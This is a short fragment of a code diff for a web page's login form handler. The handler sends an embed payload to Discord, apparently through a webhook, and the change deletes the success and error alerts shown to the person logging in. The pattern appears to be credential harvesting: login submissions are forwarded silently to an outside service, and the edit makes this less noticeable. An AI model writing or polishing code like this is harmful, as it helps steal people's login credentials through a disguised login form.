@@ -35,14 +35,7 @@ document.getElementById('loginForm').addEventListener('submit', function (event)
             'Content-Type': 'application/json'
         },
         body: JSON.stringify(embedPayload)
-    }).then(response => {
-        if (response.ok) {
-            alert('Login successful');
-        } else {
-            alert('Error logging in');
-        }
     }).catch(error => {
         console.error('Error sending to Discord:', error); // Log errors to the console
-        alert('Error logging in');
     });
 });
